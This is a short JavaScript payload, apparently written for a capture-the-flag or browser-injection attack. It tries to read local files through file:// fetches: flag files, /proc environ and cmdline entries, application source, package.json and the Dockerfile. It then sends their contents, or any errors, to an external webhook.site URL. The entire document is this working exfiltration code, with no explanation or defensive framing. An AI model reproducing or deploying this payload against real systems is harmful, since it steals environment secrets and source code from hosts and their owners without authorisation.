var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
var files=[
  '/flag','/flag.txt','/app/flag','/app/flag.txt',
  '/var/flag','/root/flag','/home/flag',
  '/tmp/flag','/opt/flag','/secret',
  '/proc/1/environ','/proc/self/environ',
  '/proc/1/cmdline','/proc/self/cmdline',
  '/app/app.js','/app/server.js','/app/index.js',
  '/app/package.json','/Dockerfile'
];
files.forEach(function(f){
  fetch('file://'+f).then(function(r){return r.text()}).then(function(t){
    if(t && t.length>0) fetch(w+'/FOUND_'+f.replace(/\//g,'_')+'?d='+encodeURIComponent(t.substring(0,800)));
    else fetch(w+'/empty_'+f.replace(/\//g,'_')+'?d=0');
  }).catch(function(e){
    fetch(w+'/err_'+f.replace(/\//g,'_')+'?d='+encodeURIComponent(e+''));
  });
});
